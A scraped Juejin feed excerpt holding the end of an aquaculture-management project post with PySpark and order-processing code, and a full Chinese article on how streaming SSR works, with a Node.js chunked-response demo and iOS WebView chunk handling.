    df = df.withColumn(<span class="hljs-string">"record_date"</span>, to_date(col(<span class="hljs-string">"record_date"</span>), <span class="hljs-string">"yyyy-MM-dd"</span>)) \
           .withColumn(<span class="hljs-string">"feed_amount_kg"</span>, col(<span class="hljs-string">"feed_amount"</span>).cast(<span class="hljs-string">"double"</span>)) \
           .withColumn(<span class="hljs-string">"growth_rate_g_day"</span>, col(<span class="hljs-string">"growth_rate"</span>).cast(<span class="hljs-string">"double"</span>))
    growth_analysis = df.groupBy(<span class="hljs-string">"species_id"</span>, <span class="hljs-string">"record_date"</span>) \
                        .agg(avg(<span class="hljs-string">"growth_rate_g_day"</span>).alias(<span class="hljs-string">"avg_growth_rate"</span>))
    anomalous_records = growth_analysis.join(
        spark.createDataFrame(list(species_thresholds.items()), [<span class="hljs-string">"species_id"</span>, <span class="hljs-string">"min_growth_threshold"</span>]),
        <span class="hljs-keyword">on</span>=<span class="hljs-string">"species_id"</span>
    ).filter(col(<span class="hljs-string">"avg_growth_rate"</span>) &lt; col(<span class="hljs-string">"min_growth_threshold"</span>))
    anomalies_collected = anomalous_records.collect()
    results = []
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> anomalies_collected:
        results.append(f<span class="hljs-string">"Anomaly detected for Species {row['species_id']} on {row['record_date']}: Average growth rate {row['avg_growth_rate']:.2f}g/day is below threshold {row['min_growth_threshold']:.2f}g/day."</span>)
    spark.stop()
    <span class="hljs-keyword">return</span> results
# --- Core Functionality <span class="hljs-number">2</span>: 水产订单管理 (Aquaculture Order Processing) ---
# Processes <span class="hljs-keyword">new</span> aquaculture product orders, including stock validation and inventory updates.
# Simulates database interactions using global dictionaries.
db_products_sim = {
    <span class="hljs-number">1</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"Tilapia"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">12.5</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">100</span>},
    <span class="hljs-number">2</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-number">2</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"Shrimp"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">25.0</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">200</span>},
    <span class="hljs-number">3</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-number">3</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"Salmon"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">30.0</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">50</span>},
}
db_orders_sim = {}
db_order_items_sim = []
order_id_counter = <span class="hljs-number">1</span>
def process_aquaculture_order(user_id: <span class="hljs-built_in">int</span>, order_items_data: list):
    global order_id_counter
    <span class="hljs-keyword">if</span> not order_items_data:
        raise ValueError(<span class="hljs-string">"Order must contain items."</span>)
    total_amount = <span class="hljs-number">0.0</span>
    products_to_update = {}
    <span class="hljs-keyword">for</span> item_data <span class="hljs-keyword">in</span> order_items_data:
        product_id = item_data.<span class="hljs-keyword">get</span>(<span class="hljs-string">"product_id"</span>)
        quantity = item_data.<span class="hljs-keyword">get</span>(<span class="hljs-string">"quantity"</span>)
        <span class="hljs-keyword">if</span> not product_id or not quantity or quantity &lt;= <span class="hljs-number">0</span>:
            raise ValueError(<span class="hljs-string">"Invalid product ID or quantity in order item."</span>)
        product = db_products_sim.<span class="hljs-keyword">get</span>(product_id)
        <span class="hljs-keyword">if</span> not product:
            raise ValueError(f<span class="hljs-string">"Product with ID {product_id} not found."</span>)
        <span class="hljs-keyword">if</span> product[<span class="hljs-string">"stock"</span>] &lt; quantity:
            raise ValueError(f<span class="hljs-string">"Insufficient stock for product {product['name']}. Available: {product['stock']}, Requested: {quantity}."</span>)
        sub_total = product[<span class="hljs-string">"price"</span>] * quantity
        total_amount += sub_total
        products_to_update[product_id] = {<span class="hljs-string">"product_ref"</span>: product, <span class="hljs-string">"quantity"</span>: quantity, <span class="hljs-string">"unit_price"</span>: product[<span class="hljs-string">"price"</span>]}
    new_order_id = order_id_counter
    order_id_counter += <span class="hljs-number">1</span>
    new_order = {
        <span class="hljs-string">"id"</span>: new_order_id,
        <span class="hljs-string">"user_id"</span>: user_id,
        <span class="hljs-string">"order_date"</span>: datetime.now(),
        <span class="hljs-string">"total_amount"</span>: total_amount,
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"CONFIRMED"</span>,
        <span class="hljs-string">"items"</span>: []
    }
    db_orders_sim[new_order_id] = new_order
    <span class="hljs-keyword">for</span> product_id, item_info <span class="hljs-keyword">in</span> products_to_update.items():
        order_item = {
            <span class="hljs-string">"order_id"</span>: new_order_id,
            <span class="hljs-string">"product_id"</span>: item_info[<span class="hljs-string">"product_ref"</span>][<span class="hljs-string">"id"</span>],
            <span class="hljs-string">"quantity"</span>: item_info[<span class="hljs-string">"quantity"</span>],
            <span class="hljs-string">"unit_price"</span>: item_info[<span class="hljs-string">"unit_price"</span>]
        }
        db_order_items_sim.append(order_item)
        item_info[<span class="hljs-string">"product_ref"</span>][<span class="hljs-string">"stock"</span>] -= item_info[<span class="hljs-string">"quantity"</span>]
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"order_id"</span>: new_order[<span class="hljs-string">"id"</span>], <span class="hljs-string">"total_amount"</span>: new_order[<span class="hljs-string">"total_amount"</span>], <span class="hljs-string">"status"</span>: new_order[<span class="hljs-string">"status"</span>]}
# --- Core Functionality <span class="hljs-number">3</span>: 水产推荐系统 (Aquaculture Product Recommendation Engine) ---
# Generates personalized aquaculture product recommendations using Spark<span class="hljs-string">'s ALS algorithm.
def get_aquaculture_recommendations_spark(interaction_data_path: str, user_id_to_recommend: int, num_recommendations: int = 5):
    spark = SparkSession.builder \
        .appName("AquacultureRecommendationEngine") \
        .config("spark.some.other.config.option", "another-value") \
        .getOrCreate()
    schema = StructType([
        StructField("user_id", IntegerType(), True),
        StructField("product_id", IntegerType(), True),
        StructField("rating", FloatType(), True)
    ])
    interactions_df = spark.read.csv(interaction_data_path, header=True, schema=schema)
    als = ALS(maxIter=5, regParam=0.01, userCol="user_id", itemCol="product_id", ratingCol="rating",
              coldStartStrategy="drop")
    model = als.fit(interactions_df)
    user_df = spark.createDataFrame([(user_id_to_recommend,)], ["user_id"])
    recommendations = model.recommendForUserSubset(user_df, num_recommendations)
    recommended_product_ids = []
    if recommendations.count() &gt; 0:
        for row in recommendations.collect()[0]["recommendations"]:
            recommended_product_ids.append(row["product_id"])
    spark.stop()
    return recommended_product_ids
</span></code></pre>
<h2 data-id="heading-4">基于SpringBoot的水产养殖管理系统文档展示</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab8f270cf20849deabba7f02492a91ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=qTpbat7rDSSgocev9ijQZljSUZ4%3D" alt="文档.png" loading="lazy"/></p>
<blockquote>
<p>💖💖作者：计算机毕业设计小途
💙💙个人简介：曾长期从事计算机专业培训教学，本人也热爱上课教学，语言擅长Java、微信小程序、Python、Golang、安卓Android等，开发项目包括大数据、深度学习、网站、小程序、安卓、算法。平常会做一些项目定制化开发、代码讲解、答辩教学、文档编写、也懂一些降重方面的技巧。平常喜欢分享一些自己开发中遇到的问题的解决办法，也喜欢交流技术，大家有技术代码这一块的问题可以问我！
💛💛想说的话：感谢大家的关注与支持！
💜💜
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011385.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011385.html" ref="nofollow noopener noreferrer">网站实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011386.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011386.html" ref="nofollow noopener noreferrer">安卓/小程序实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011387.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011387.html" ref="nofollow noopener noreferrer">大数据实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011390.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011390.html" ref="nofollow noopener noreferrer">深度学习实战项目</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浅入理解流式SSR的性能收益与工作原理]]></title>    <link>https://juejin.cn/post/7575090551357407284</link>    <guid>https://juejin.cn/post/7575090551357407284</guid>    <pubDate>2025-11-23T04:51:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357407284" data-draft-id="7570912420568481802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浅入理解流式SSR的性能收益与工作原理"/> <meta itemprop="keywords" content="前端,iOS"/> <meta itemprop="datePublished" content="2025-11-23T04:51:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="明远湖之鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2370998127573751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浅入理解流式SSR的性能收益与工作原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2370998127573751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    明远湖之鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:51:36.000Z" title="Sun Nov 23 2025 04:51:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">什么是流式 SSR</h2>
<p>流式 SSR（Streaming Server-Side Rendering）是一种将服务端渲染和流式传输结合起来的技术。与传统的 SSR 不同，流式 SSR 可以在服务端渲染的同时，逐步将渲染结果传输到客户端，实现页面的渐进式展示。</p>
<p>在流式 SSR 中，服务端会根据客户端的请求，逐步生成页面内容，并将它们作为流式数据流式传输到客户端。客户端可以在接收到一部分数据后，就开始逐步显示页面，而不需要等待整个页面渲染完成。这种方式可以有效提高页面的加载速度和用户体验。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c8d597f865b43c79abefb42c03ca09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=7%2BPppr%2BKU2I0Z%2BX22ELwntltuHU%3D" alt="20251111002406.jpg" loading="lazy"/>
(流式 SSR 的页面加载过程）</p>
<h2 data-id="heading-1">使用流式 SSR 的收益</h2>
<ul>
<li>
<p><strong>减少设备和网络情况的副作用</strong></p>
<p>这是 SSR 渲染模式相比于传统  CSR 渲染模式带来的优势，对于流式 SSR 应用同样适用。
CSR 渲染模式需要在终端设备上完成资源加载、数据加载以及整个渲染过程，受端侧设备自身 CPU 及网络性能影响大，如设备 CPU 性能不足或网络波动较大，则此时整个页面加载性能将严重下降，这也是为什么很多页面在高端设备上加载速度较快，但在低端设备上需要7-8秒的原因。</p>
<p>而 SSR 的渲染模式，则<strong>在服务端提供了高性能的渲染容器及网络环境，服务端的渲染，不受端侧设备 CPU 或网络影响，始终提供稳定的渲染性能表现</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba73baf6b12b44a0b7b6055b1c45b7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=vYH5fhaZmJ1rFH8%2FPW4m4SNzkW0%3D" alt="fa9a1944-b6b4-4e22-980a-47bf604c2e2c.png" loading="lazy"/></p>
</li>
<li>
<p><strong>减少接口过慢对首屏性能的影响</strong></p>
<p>通常，页面会由多个区块组成，其中一些区块不依赖于数据，而其他区块可能依赖于快速或缓慢响应的接口。</p>
<p>现有 SSR 渲染模式存在的一个不足是，整个渲染过程是同步的，需要在页面渲染之前完成所有数据请求，并一次性返回整个页面的 HTML。如果页面的某些接口响应过慢，将会导致整个页面的响应时间过长。</p>
<p>流式渲染的最大好处在于它可以分块返回页面内容。例如，当请求进入时，它可以首先完成页面静态内容的渲染并响应给端侧进行渲染，等待其他依赖于数据的区块完成渲染后再分块返回。这样整个页面的渲染过程不再绑定在一起，而是一个异步的过程，先完成渲染的部分将先返回，从而优化了页面响应速度。</p>
</li>
<li>
<p><strong>提前资源的加载时机</strong></p>
<p>流式 SSR 相比传统 SSR 应用有另一个额外的收益是，由于 HTML 可以分块返回，页面的资源信息可以随第一个 HTML 片段一起下发，从而尽快开始加载。相比之下，在传统 SSR 应用中，资源信息必须等待整个 HTML 完成渲染后下发，请求开始的时机会受到渲染过程的阻塞。</p>
<p>采用流式 SSR，可以使资源请求和页面渲染过程并行进行，进一步提升了页面的性能表现。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/262454a66ef1469789c973908bdfdf86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=pueQsCLST%2FVr2owHTM95M6HTlvU%3D" alt="752472f2-cf39-4c89-9738-e4ad3e084ba9.png" loading="lazy"/></p>
</li>
<li>
<p><strong>提升页面的可交互时间</strong></p>
<p>在 SSR 渲染模式下，将页面节点达到可交互状态的过程称为 Hydrate，它需要在端侧执行 JavaScript。</p>
<p>由于页面资源可以提前下发，并且 React 18 对 Hydrate 进行了异步化处理，在流式 SSR 应用中，可以进一步实现先渲染的页面先达到可交互状态的效果。对于部分首屏接口较慢的应用，这将进一步提升页面的可交互体验。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb6d50f24ad84d6397f6b472e57ce551~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=sxEYVIj6yhciBVEKqwOPNJXnz1c%3D" alt="20251111002828.jpg" loading="lazy"/></p>
</li>
</ul>
<h2 data-id="heading-2">基本工作原理</h2>
<p>流式 SSR 的实现，最基本的原理是：</p>
<ul>
<li>基于 HTTP 协议中的 chunked 编码规范，设置响应头的 Transfer-Encoding 为 chunked 对 HTML 内容进行分块传输。</li>
<li>在浏览器侧，流式地读取数据并进行渲染，这是主流浏览器默认支持的。</li>
</ul>
<p>结合 Node.js 内置的 HTTP 模块，实现一个最简单的流式 DEMO 示例如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);

<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">async</span> (req, res) =&gt; {
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/html'</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Transfer-Encoding'</span>, <span class="hljs-string">'chunked'</span>)

  <span class="hljs-comment">// 分区块的传输页面内容</span>
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;html&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;head&gt;&lt;title&gt;Stream Demo&lt;/title&gt;&lt;head&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;body&gt;'</span>);

  <span class="hljs-comment">// 模拟服务端暂停</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;h2&gt;Hello&lt;/h2&gt;'</span>);

  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;h2&gt;ICE 3&lt;/h2&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;/body&gt;&lt;/html&gt;'</span>);
  res.<span class="hljs-title function_">end</span>();
});

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p>基于这个基本原理，将页面分为骨架屏和几个区块，并行地渲染这些区块，然后将渲染好的区块分段返回，就可以实现基本的流式 SSR 。</p>
<h2 data-id="heading-3">WebView 接收流式Chunk渲染的实现原理（iOS）</h2>
<h3 data-id="heading-4">核心组件</h3>
<p>iOS WebView 接收流式 Chunk 渲染基于 <strong>NSURLProtocol 拦截机制</strong> + <strong>NSURLProtocolClient 回调机制</strong> 实现。</p>
<p><strong>NSURLProtocol（请求拦截器）</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 拦截 WebView 的网络请求</span>
+ (<span class="hljs-variable constant_">BOOL</span>)<span class="hljs-attr">canInitWithRequest</span>:(<span class="hljs-title class_">NSURLRequest</span> *)request {
    <span class="hljs-keyword">return</span> [self <span class="hljs-attr">shouldInterceptRequest</span>:request];
}

- (<span class="hljs-keyword">void</span>)startLoading {
    <span class="hljs-comment">// 转发给自定义处理器</span>
    [[<span class="hljs-title class_">SSRHandler</span> shareInstance] <span class="hljs-attr">sendRequest</span>:self.<span class="hljs-property">request</span> <span class="hljs-attr">delegate</span>:self];
}
</code></pre>
<p><strong>NSURLProtocolClient（数据传递桥梁）</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 系统提供的协议，用于向 WebView 传递数据</span>
@protocol <span class="hljs-title class_">NSURLProtocolClient</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didReceiveResponse</span>:<span class="hljs-attr">cacheStoragePolicy</span>:;  <span class="hljs-comment">// 响应头</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didLoadData</span>:;                           <span class="hljs-comment">// 数据块（可多次）</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocolDidFinishLoading</span>:;                       <span class="hljs-comment">// 完成</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didFailWithError</span>:;                      <span class="hljs-comment">// 错误</span>
@end

</code></pre>
<h3 data-id="heading-5">渲染流程</h3>
<ul>
<li>
<p><strong>阶段一：请求拦截</strong></p>
<pre><code class="hljs language-objectivec" lang="objectivec">WebView 发起请求 → <span class="hljs-built_in">NSURLProtocol</span> 拦截 → 转发给 SSR 处理器
</code></pre>
</li>
<li>
<p><strong>阶段二：响应处理</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. 返回响应头</span>
[<span class="hljs-meta">client URLProtocol:protocol didReceiveResponse:response cacheStoragePolicy:policy</span>];

<span class="hljs-comment">// 2. 流式返回数据（关键步骤）</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunk1</span>];  <span class="hljs-comment">// 第1块</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunk2</span>];  <span class="hljs-comment">// 第2块</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunkN</span>];  <span class="hljs-comment">// 第N块</span>

<span class="hljs-comment">// 3. 标记完成</span>
[<span class="hljs-meta">client URLProtocolDidFinishLoading:protocol</span>];
</code></pre>
</li>
<li>
<p><strong>阶段三：WebView 渲染</strong></p>
<pre><code class="hljs language-css" lang="css">每次 didLoadData 调用 → WebView 增量解析 <span class="hljs-selector-tag">HTML</span> → 实时渲染到页面
</code></pre>
</li>
</ul>
<p><strong>数据流图示如下</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────┐    ┌──────────────┐    ┌─────────────┐
│   WebView   │───▶│NSURLProtocol │───▶│ SSR Handler │
│             │    │              │    │             │
│             │◀───│              │◀───│             │
└─────────────┘    └──────────────┘    └─────────────┘
       ▲                   │
       │                   ▼
   增量渲染          NSURLProtocolClient
       ▲                   │
       │                   ▼
   ┌─────────────────────────────┐
   │     didLoadData (chunk1)    │
   │     didLoadData (chunk2)    │
   │     didLoadData (chunkN)    │
   │  URLProtocolDidFinishLoading │
   └─────────────────────────────┘
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JHandler——一套简单易用的 C++ 事件循环机制]]></title>    <link>https://juejin.cn/post/7575349314945368105</link>    <guid>https://juejin.cn/post/7575349314945368105</guid>    <pubDate>2025-11-23T04:52:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575349314945368105" data-draft-id="7575159361904345129" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JHandler——一套简单易用的 C++ 事件循环机制"/> <meta itemprop="keywords" content="Android,HarmonyOS,C++"/> <meta itemprop="datePublished" content="2025-11-23T04:52:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江澎涌"/> <meta itemprop="url" content="https://juejin.cn/user/1820446986338504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JHandler——一套简单易用的 C++ 事件循环机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1820446986338504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江澎涌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:52:34.000Z" title="Sun Nov 23 2025 04:52:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
